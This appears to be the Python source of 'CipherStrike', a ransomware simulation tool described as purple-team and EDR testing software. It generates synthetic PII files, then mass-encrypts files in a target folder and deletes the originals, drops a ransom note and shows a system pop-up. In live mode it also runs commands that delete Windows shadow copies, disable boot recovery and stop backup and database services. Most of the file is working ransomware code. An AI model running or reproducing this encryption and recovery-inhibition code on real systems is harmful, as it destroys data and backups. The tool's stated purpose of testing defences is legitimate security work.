# ----- License -------------------------------------------------- # 

#  CipherStrike - CipherStrike generates synthetic records and performs 
#  ransomware behavior exercises using file encryption, recovery commands, 
#  and configurable system actions for testing.
#  Copyright (c) 2026 - CursedSec (Operated by Cursed271). All rights reserved.

#  This software is an proprietary intellectual property developed for
#  penetration testing, threat modeling, and security research. It   
#  is licensed under the CURSEDSEC OWNERSHIP EDICT:
#
#  🚫 PROHIBITION WARNING 🚫
#  Redistribution, re-uploading, and unauthorized modification are strictly forbidden 
#  under the COE. Use is granted ONLY under the limited terms defined in the official 
#  LICENSE file (COE), which must be included in all copies.

#  DISCLAIMER:
#  This tool is intended for **educational or ethical testing** purposes only.
#  Unauthorized or malicious use of this software against systems without 
#  proper authorization is strictly prohibited and may violate laws and regulations.
#  The author assumes no liability for misuse or damage caused by this tool.

#  🔗 LICENSE: CURSEDSEC OWNERSHIP EDICT (COE)
#  🔗 Repository: https://github.com/Cursed271
#  🔗 Author: Steven Pereira (@Cursed271)

# ----- Libraries ------------------------------------------------ #

import os
import sys
import time
import math
import typer
import random
import ctypes
import string
import platform
import subprocess
from pathlib import Path
from rich.text import Text
from rich.rule import Rule
from rich.panel import Panel
from rich.console import Console
from typing import List, Optional
import typer.rich_utils as typer_rich
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ----- Global Declaration --------------------------------------- #

app = typer.Typer(rich_markup_mode="rich")
console = Console()

TARGET_EXTENSIONS = {
    ".docx", ".xlsx", ".pptx", ".pdf", ".txt", ".csv",
    ".sql", ".db", ".mdb", ".jpg", ".png", ".zip", ".7z"
}

# ----- System Pop-up Notification ------------------------------- #

def system_popup(title: str, message: str) -> None:
    os_name = platform.system().lower()
    try:
        if os_name == "windows":
            ctypes.windll.user32.MessageBoxW(0, message, title, 0x10 | 0x1000)
        elif os_name == "darwin":
            clean_msg = message.replace('"', '\\"').replace("'", "\\'")
            clean_title = title.replace('"', '\\"').replace("'", "\\'")
            script = (
                f'display dialog "{clean_msg}" '
                f'with title "{clean_title}" '
                f'buttons {{"OK"}} default button "OK" with icon stop'
            )
            subprocess.run(["osascript", "-e", script], check=False)
        elif os_name == "linux":
            try:
                subprocess.run(
                    ["zenity", "--error", f"--title={title}", f"--text={message}", "--width=450"],
                    check=True,
                    timeout=5
                )
                return
            except Exception:
                pass
            try:
                subprocess.run(
                    ["kdialog", "--error", message, f"--title={title}"],
                    check=True,
                    timeout=5
                )
                return
            except Exception:
                pass
            subprocess.run(["notify-send", "-u", "critical", title, message], check=False)
    except Exception:
        pass

# ----- PII Generator -------------------------------------------- #

def gen_pan() -> str:
    letters = "".join(random.choices(string.ascii_uppercase, k=5))
    digits = f"{random.randint(1000, 9999)}"
    end = random.choice(string.ascii_uppercase)
    return f"{letters}{digits}{end}"

def gen_mynumber() -> str:
    return "".join(str(random.randint(0, 9)) for _ in range(12))

def gen_license() -> str:
    return "".join(str(random.randint(0, 9)) for _ in range(12))

def gen_ssn() -> str:
    return f"{random.randint(100, 899)}-{random.randint(10, 99)}-{random.randint(1000, 9999)}"

def gen_iban() -> str:
    country = random.choice(["DE", "FR", "NL", "ES", "IT"])
    return f"{country}{random.randint(10, 99)} {' '.join(str(random.randint(1000, 9999)) for _ in range(4))}"

def gen_pii(record_id: int) -> str:
    first_names = ["Hiroshi", "Yuki", "Aarav", "Priya", "John", "Sarah", "Lucas", "Emma", "Kenji", "Ananya"]
    last_names = ["Tanaka", "Sato", "Sharma", "Patel", "Smith", "Johnson", "Müller", "Dubois", "Suzuki", "Kumar"]
    cities = ["Tokyo", "Osaka", "Mumbai", "Bengaluru", "New York", "Chicago", "Berlin", "Paris"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    full_name = f"{first} {last}"
    email = f"{first.lower()}.{last.lower()}{random.randint(10, 99)}@corp-simulation.net"
    city = random.choice(cities)
    return f"""================================================================================
CONFIDENTIAL EMPLOYEE & CUSTOMER PII RECORD - #{record_id:06d}
================================================================================
[SUBJECT BIOGRAPHICAL PROFILE]
Full Legal Name       : {full_name}
Date of Birth         : {random.randint(1970, 2004)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}
Gender                : {random.choice(['Male', 'Female', 'Non-Binary'])}
Primary Residence     : {random.randint(10, 999)} Chuo Avenue, {city}
Contact Telephone     : +{random.randint(1, 91)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}
Work / Primary Email  : {email}

--------------------------------------------------------------------------------
1. JURISDICTION: JAPAN (APPI - 個人情報の保護に関する法律)
--------------------------------------------------------------------------------
My Number (個人番号)       : {gen_mynumber()}
Driver's License (運転免許証) : {gen_license()}
Health Insurance (記号・番号) : 国民健康保険 記号-{random.randint(1000, 9999)} 番号-{random.randint(100000, 999999)}
Basic Resident Card (住民票)  : JP-REG-{random.randint(10000000, 99999999)}

--------------------------------------------------------------------------------
2. JURISDICTION: UNITED STATES (HIPAA / State Breach Notification Laws)
--------------------------------------------------------------------------------
Social Security Number (SSN) : {gen_ssn()}
US Passport Number           : {random.choice(string.ascii_uppercase)}{random.randint(10000000, 99999999)}
State Driver's License (DL)  : DL-{random.choice(string.ascii_uppercase)}{random.randint(1000000, 9999999)}
DEA / NPI Registry ID        : US-NPI-{random.randint(1000000000, 9999999999)}

--------------------------------------------------------------------------------
3. JURISDICTION: EUROPEAN UNION (GDPR - Regulation 2016/679)
--------------------------------------------------------------------------------
International Bank (IBAN)    : {gen_iban()}
Tax Identification (TIN/Steuer) : EU-TIN-{random.randint(1000000000, 9999999999)}
National Health Identifier   : FR-NIR-1-{random.randint(70, 99)}-{random.randint(10, 99)}-{random.randint(100, 999)}
Special Category Health Data : Blood Type {random.choice(['A+', 'B+', 'O+', 'AB-'])}; Chronic Allergy: Penicillin

--------------------------------------------------------------------------------
4. JURISDICTION: INDIA (DPDP Act 2023)
--------------------------------------------------------------------------------
Aadhaar Number (UIDAI)       : {random.randint(1000, 9999)} {random.randint(1000, 9999)} {random.randint(1000, 9999)}
PAN Card Identifier          : {gen_pan()}
Voter Identity (EPIC)        : {random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.randint(1000000, 9999999)}
IFSC & Settlement Account    : HDFC000{random.randint(1000, 9999)} / Acc: {random.randint(100000000000, 999999999999)}
================================================================================
"""

# ----- Trigger MITRE ATTACK IoCs -------------------------------- #

def trigger_t1490(safe_mode: bool = True) -> None:
    console.print(f"[#BB9AF7][~] Simulating MITRE ATT&CK T1490 - Inhibit System Recovery...")
    commands = [
        ["vssadmin", "delete", "shadows", "/all", "/quiet"] if not safe_mode else ["vssadmin", "list", "shadows"],
        ["wmic", "shadowcopy", "delete"] if not safe_mode else ["wmic", "shadowcopy", "list", "brief"],
        ["bcdedit", "/set", "{default}", "recoveryenabled", "no"] if not safe_mode else ["bcdedit", "/enum", "{default}"]
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        except Exception:
            pass

def trigger_t1489(safe_mode: bool = True) -> None:
    console.print(f"[#BB9AF7][~] Simulating MITRE ATT&CK T1489 - Service Termination...")
    services = ["MSSQLSERVER", "VeeamDeploymentService", "BackupExecRPCService"]
    for svc in services:
        cmd = ["net", "stop", svc] if not safe_mode else ["sc", "query", svc]
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=4)
        except Exception:
            pass

# ----- Cryptographic Engine ------------------------------------- #

def crypt_derive_key(secret: str) -> bytes:
    import hashlib
    return hashlib.sha256(secret.encode()).digest()

def crypt_encrypt_bytes(data: bytes, key: bytes) -> bytes:
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(data) + encryptor.finalize()

def crypt_decrypt_bytes(data: bytes, key: bytes) -> bytes:
    iv = data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data[16:]) + decryptor.finalize()

def crypt_encrypt_file(file_path: Path, key: bytes) -> None:
    try:
        data = file_path.read_bytes()
        encrypted = crypt_encrypt_bytes(data, key)
        enc_path = file_path.with_suffix(file_path.suffix + ".cipherstrike")
        enc_path.write_bytes(encrypted)
        file_path.unlink()
    except Exception:
        pass

def crypt_decrypt_file(file_path: Path, key: bytes) -> None:
    try:
        data = file_path.read_bytes()
        decrypted = crypt_decrypt_bytes(data, key)
        orig_path = file_path.with_suffix("")
        orig_path.write_bytes(decrypted)
        file_path.unlink()
    except Exception:
        pass

# ----- Ransom Note ---------------------------------------------- #

def ransom_note(target_dir: Path) -> None:
    note = (
        "=================================================================\n"
        "                  !!! CIPHERSTRIKE ADVERSARY SIMULATION !!!       \n"
        "=================================================================\n"
        "All sensitive enterprise documents in this path have been        \n"
        "encrypted with AES-256 by the CipherStrike Purple Team Harness.  \n\n"
        "MITRE ATT&CK Techniques Executed:                                \n"
        "- T1490: Inhibit System Recovery (VSS / BCDEdit Telemetry)       \n"
        "- T1489: Service Stop (Database & Backup Handle Termination)     \n"
        "- T1486: Data Encrypted for Impact (High Entropy Burst)          \n"
        "- T1083: File and Directory Discovery                            \n"
        "- T1491: Defacement / Modal Alert Notification                   \n\n"
        "Verify your EDR console (CrowdStrike / Trend Micro) immediately. \n"
        "Execute 'python CipherStrike.py recover' to restore all files.   \n"
        "=================================================================\n"
    )
    (target_dir / "HOW_TO_RECOVER_FILES.txt").write_text(note, encoding="utf-8")

# ----- ASCII Banner --------------------------------------------- #

def ascii() -> None:
    art_content = rf"""
  .oooooo.    o8o             oooo                            .oooooo..o     .             o8o  oooo
 d8P'  `Y8b   `"'             `888                           d8P'    `Y8   .o8             `"'  `888
888          oooo  oo.ooooo.   888 .oo.    .ooooo.  oooo d8b Y88bo.      .o888oo oooo d8b oooo   888  oooo   .ooooo.
888          `888   888' `88b  888P"Y88b  d88' `88b `888""8P  `"Y8888o.    888   `888""8P `888   888 .8P'   d88' `88b
888           888   888   888  888   888  888ooo888  888          `"Y88b   888    888      888   888888.    888ooo888
`88b    ooo   888   888   888  888   888  888    .o  888     oo     .d8P   888 .  888      888   888 `88b.  888    .o
 `Y8bood8P'  o888o  888bod8P' o888o o888o `Y8bod8P' d888b    8""88888P'    "888" d888b    o888o o888o o888o `Y8bod8P'
                    888
                   o888o
"""
    art_color = Text(art_content, style = "#C6ECE3")
    art_panel = Panel(art_color, border_style = "#C6ECE3", expand = False)
    console.print(art_panel)
    banner_width = console.measure(art_panel).maximum
    console.print(Rule(style = "#C6ECE3 blink"), width = banner_width)
    console.print(f"  [~] Created by [bold red blink]Cursed271[/bold red blink]")
    console.print(f"  [~] CipherStrike - Exercise the impact. Inspect the defense.")
    console.print(Rule(style = "#C6ECE3 blink"), width = banner_width)
    console.print()
    return banner_width

# ----- Argument Parser - Generate ------------------------------- #

@app.command()
def generate_pii(
    target_dir: str = typer.Option("Important Data", "--dir", "-d", help="Folder where PII files will be written"),
    count: int = typer.Option(50, "--count", "-c", help="Number of multinational PII files to create"),
    threads: int = typer.Option(16, "--threads", "-t", help="Concurrency for file generation"),
) -> None:
    path = Path(target_dir)
    path.mkdir(parents=True, exist_ok=True)
    console.print(Panel(
        f"[bold white]Target Directory:[/bold white] {path.resolve()}\n"
        f"[bold white]Files to Generate:[/bold white] {count}\n"
        f"[bold white]Jurisdictions Covered:[/bold white] Japan (APPI), US (HIPAA/SSN), EU (GDPR), India (DPDP)",
        title="[bold green]CipherStrike - PII Generator[/bold green]",
        border_style="green",
        width=banner_width
    ))
    def _write_single_pii(idx: int):
        fpath = path / f"Customer_PII_Record_{idx:04d}.txt"
        fpath.write_text(gen_pii(idx), encoding="utf-8")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        list(executor.map(_write_single_pii, range(1, count + 1)))
    console.print(f"[#2ECC71][+] Successfully created {count} authentic multinational PII files in '{target_dir}'.")

# ----- Argument Parser - Simulate ------------------------------- #

@app.command()
def simulate(
    target_dir: str = typer.Option("Important Data", "--dir", "-d", help="Target directory for attack simulation"),
    password: str = typer.Option("CursedSec2026!CipherStrike", "--key", "-k", help="Secret encryption key"),
    safe_mode: bool = typer.Option(True, "--safe-mode/--live-mode", help="Safe mode audits VSS/Services without unrecoverable damage"),
    threads: int = typer.Option(16, "--threads", "-t", help="Worker threads for encryption velocity"),
) -> None:
    path = Path(target_dir)
    if not path.exists():
        console.print(f"[bold #FF6B6B][!] Target directory does not exist: {path}. Run 'generate-pii' first.")
        sys.exit(1)
    key = crypt_derive_key(password)
    console.print(Panel(
        f"[bold white]Target Scope:[/bold white] {path.resolve()}\n"
        f"[bold white]Execution Mode:[/bold white] {'SAFE MODE (Audit Triggers)' if safe_mode else 'LIVE ADVERSARY MODE'}\n"
        f"[bold white]Attack Kill-Chain:[/bold white] T1490 -> T1489 -> T1083 -> T1486 -> T1491",
        title="[bold red]CipherStrike - EDR Behavioral Stress Harness[/bold red]",
        border_style="red",
        width=banner_width
    ))
    trigger_t1490(safe_mode=safe_mode)
    trigger_t1489(safe_mode=safe_mode)
    console.print(f"[#BB9AF7][~] Discovering candidate high-value assets (T1083)...")
    files_to_encrypt = [
        f for f in path.rglob("*")
        if f.is_file() and f.suffix.lower() in TARGET_EXTENSIONS and not f.name.endswith(".cipherstrike")
    ]
    console.print(f"[#2ECC71][+] Located {len(files_to_encrypt)} sensitive documents/PII records in scope.")
    if not files_to_encrypt:
        console.print(f"[bold #FF6B6B][!] No matching files found to encrypt. Run 'generate-pii' first.")
        return
    console.print(f"[bold #FF6B6B][!] Initiating High-Velocity Mass Encryption (T1486) with {threads} threads...")
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        list(executor.map(lambda f: crypt_encrypt_file(f, key), files_to_encrypt))
    duration = time.time() - start_time
    rate = len(files_to_encrypt) / max(duration, 0.01)
    console.print(f"[#2ECC71][+] Encryption completed in {duration:.2f} seconds ({rate:.1f} files/sec).")
    ransom_note(path)
    console.print(f"[#2ECC71][+] Ransom note written to HOW_TO_RECOVER_FILES.txt")
    popup_title = "!!! ATTENTION: FILES ENCRYPTED (CIPHERSTRIKE) !!!"
    popup_msg = (
        "All sensitive enterprise documents and PII databases in this path have been encrypted.\n\n"
        "This is an authorized Purple Team Ransomware Simulation (CipherStrike).\n"
        "Inspect CrowdStrike Falcon / Trend Micro consoles for T1490 and T1486 IOAs.\n\n"
        "Refer to HOW_TO_RECOVER_FILES.txt for full recovery instructions."
    )
    console.print(f"[bold #FF6B6B][!] Triggering Native System Modal Popup (T1491.001)...")
    system_popup(title=popup_title, message=popup_msg)
    console.print(f"[#2ECC71][+] Simulation pipeline concluded.")

# ----- Argument Parser - Recover -------------------------------- #

@app.command()
def recover(
    target_dir: str = typer.Option("Important Data", "--dir", "-d", help="Target directory to restore"),
    password: str = typer.Option("CursedSec2026!CipherStrike", "--key", "-k", help="Secret decryption key"),
    threads: int = typer.Option(16, "--threads", "-t", help="Worker threads for decryption"),
) -> None:
    path = Path(target_dir)
    key = crypt_derive_key(password)
    encrypted_files = [f for f in path.rglob("*.cipherstrike") if f.is_file()]
    console.print(f"[#BB9AF7][~] Decrypting {len(encrypted_files)} encrypted assets in {path}...")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        list(executor.map(lambda f: crypt_decrypt_file(f, key), encrypted_files))
    note_path = path / "HOW_TO_RECOVER_FILES.txt"
    if note_path.exists():
        note_path.unlink()
    console.print(f"[#2ECC71][+] Recovery complete. All original PII and document files restored.")

# ----- Main Function -------------------------------------------- #

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    banner_width = ascii()
    typer_rich.MAX_WIDTH = banner_width
    app()

# ----- End ------------------------------------------------------ #